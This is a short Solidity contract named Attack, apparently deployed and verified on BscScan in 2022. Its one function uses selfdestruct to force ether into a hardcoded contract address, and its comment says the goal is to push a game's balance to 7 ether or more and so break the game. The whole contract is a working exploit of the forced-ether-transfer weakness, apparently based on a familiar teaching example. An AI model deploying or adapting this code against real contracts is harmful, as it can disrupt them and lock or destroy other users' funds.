/**
 *Submitted for verification at BscScan.com on 2022-04-14
*/

contract Attack {
    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(0x89f5967f02e70401Dc26ec55e5A482eA4e294778));
        selfdestruct(addr);
    }
}